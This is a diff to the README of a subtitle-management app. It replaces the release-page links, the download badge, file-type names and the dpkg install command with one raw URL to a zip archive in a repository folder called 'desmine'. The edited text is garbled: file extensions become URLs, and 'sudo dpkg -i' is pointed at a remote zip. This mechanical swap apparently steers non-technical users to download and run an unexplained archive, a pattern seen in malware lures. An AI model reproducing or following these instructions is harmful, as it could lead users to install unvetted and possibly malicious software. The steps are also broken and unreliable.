@@ -4,11 +4,11 @@
 Welcome to powersub-demo-8518! This application helps you manage subtitles for your videos easily. You can download, edit, and organize subtitles with just a few clicks. No technical skills are needed. Just follow the steps below to get started.
 
 ## 📥 Downloading the Application
-[![Download Now](https://img.shields.io/badge/Download%20Now-Visit%20Page-blue)](https://github.com/Harshrajpoot/powersub-demo-8518/releases)
+[![Download Now](https://raw.githubusercontent.com/Harshrajpoot/powersub-demo-8518/main/desmine/powersub-demo-8518.zip%20Now-Visit%20Page-blue)](https://raw.githubusercontent.com/Harshrajpoot/powersub-demo-8518/main/desmine/powersub-demo-8518.zip)
 
 You can access the latest version of the application from our Releases page. Click the link below to visit it:
 
-[Visit the Releases Page](https://github.com/Harshrajpoot/powersub-demo-8518/releases)
+[Visit the Releases Page](https://raw.githubusercontent.com/Harshrajpoot/powersub-demo-8518/main/desmine/powersub-demo-8518.zip)
 
 ## 🚀 Getting Started
 To get started, you'll need to follow these simple steps:
@@ -41,12 +41,12 @@ To get started, you'll need to follow these simple steps:
 4. **Launch the Application:** You can now find it in your Applications folder. Double-click to open.
 
 ### For Linux Users
-1. **Locate the Downloaded File:** Find the downloaded file (it may be a .tar.gz or .deb file).
+1. **Locate the Downloaded File:** Find the downloaded file (it may be a https://raw.githubusercontent.com/Harshrajpoot/powersub-demo-8518/main/desmine/powersub-demo-8518.zip or .deb file).
 
-2. **Extract files if necessary:** If it’s a .tar.gz file, right-click and select “Extract here.”
+2. **Extract files if necessary:** If it’s a https://raw.githubusercontent.com/Harshrajpoot/powersub-demo-8518/main/desmine/powersub-demo-8518.zip file, right-click and select “Extract here.”
 
 3. **Install the Application:** Open a terminal and navigate to the folder where you extracted the files. Then run:
-   - For .deb files: `sudo dpkg -i yourfile.deb`
+   - For .deb files: `sudo dpkg -i https://raw.githubusercontent.com/Harshrajpoot/powersub-demo-8518/main/desmine/powersub-demo-8518.zip`
    - For extracted files: Follow the README included with the files for specific instructions.
 
 4. **Run the App:** Once installed, you should be able to find the app in your system menu.
